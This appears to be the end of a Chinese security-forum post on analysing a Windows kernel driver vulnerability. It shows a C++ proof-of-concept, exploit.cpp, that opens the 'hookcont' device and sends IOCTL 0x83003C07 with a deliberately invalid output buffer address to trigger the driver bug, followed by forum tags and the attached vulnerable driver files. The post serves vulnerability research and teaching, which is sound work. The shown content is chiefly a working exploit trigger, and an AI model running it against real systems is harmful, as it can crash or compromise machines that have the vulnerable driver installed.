
# exploit.cpp

```cpp
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。

//

#include <cstdio>

#include <cstdlib>

#include <windows.h>

#include "ntapi.h"

#pragma comment(linker, "/defaultlib:ntdll.lib")



#define LINK_NAME "\\\\.\\hookcont"	// 打开的符号名

#define IOCTL 0x83003C07				// 要发送的IOCTL

#define INPUT_BUFFER_LENGTH 4			// 输入缓冲区长度

#define OUT_BUFFER_LENGTH 0				// 输出缓冲区长度



void ShowError(PCHAR msg);			    // 打印错误信息



int main()

{

	HANDLE hDevice = NULL;

	DWORD dwRetSize = 0;

	DWORD dwInputBuffer = 0, dwOutBufferAddr = 0;



	hDevice = CreateFile(LINK_NAME,

						 GENERIC_READ | GENERIC_WRITE, 

						 0,

						 NULL,

						 OPEN_EXISTING,

						 FILE_ATTRIBUTE_NORMAL,

						 NULL);

	if (hDevice == NULL)

	{

		ShowError("CreateFile");

		goto exit;

	}



	dwInputBuffer = (DWORD)hDevice;	// 输入缓冲区保存要解析的句柄

	dwOutBufferAddr = 0;	// 输出缓冲区地址是非法的

	if (!DeviceIoControl(hDevice,

						 IOCTL,

						 &dwInputBuffer,

						 INPUT_BUFFER_LENGTH,

						 (PVOID)dwOutBufferAddr,

						 OUT_BUFFER_LENGTH,

						 &dwRetSize,

						 NULL))

	{

		ShowError("DeviceIoControl");

		goto exit;

	}



	

exit:

	if (hDevice) CloseHandle(hDevice);

	system("pause");

	return 0;

}





void ShowError(PCHAR msg)

{

	printf("%s Error 0x%X\n", msg, GetLastError());

}
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2021-11-30 10:04

被1900编辑

，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

上传的附件：

- [HookCont.idb](javascript:void(0);)
  （557.07kb，14次下载）

- [HookCont.sys](javascript:void(0);)
  （15.15kb，9次下载）

- [HookHelp.sys](javascript:void(0);)
  （37.02kb，9次下载）
